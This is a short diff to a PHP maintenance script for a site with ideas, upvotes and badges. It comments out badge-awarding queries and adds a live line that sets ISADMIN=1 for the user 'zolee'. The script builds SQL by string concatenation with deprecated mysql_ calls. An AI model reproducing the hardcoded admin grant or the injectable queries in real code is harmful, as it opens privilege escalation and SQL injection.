@@ -751,7 +751,7 @@
 		}
 */
 
-
+/*
 		$q = "SELECT count(*) as num ,USERNAME from USERUPVOTES group by USERNAME;";
 		$r = mysql_query($q) or die(mysql_error());
 		while($row = mysql_fetch_assoc($r)){
@@ -771,7 +771,37 @@
 				mysql_query($iq) or die(mysql_error());
 			}
 			
-		}
+		}*/
+
+/*
+		$q = "SELECT UPVOTE , USERNAME from IDEAS;";
+		$u = array();
+		$r = mysql_query($q) or die(mysql_error());
+		while($row = mysql_fetch_assoc($r)){
+
+			if($row["USERNAME"] == 'anonymous' || $row["USERNAME"] == 'The Anonymous')
+				continue;
+			if(in_array($row['USERNAME'], $u))
+				continue;
+
+			if($row["UPVOTE"] >=25){
+				$iq = "insert into BADGEMAP values ('".$row['USERNAME']."' , 19);";
+				$u[] = $row['USERNAME'];
+
+				echo $iq.'<br>';
+				//mysql_query($iq) or die(mysql_error());
+			}
+
+			
+			
+		}*/
+
+		$q = "UPDATE USERS SET ISADMIN=1 where USERNAME='zolee'";
+		mysql_query($q) or die(mysql_error());
+
+
+
+
 
 
 ?>
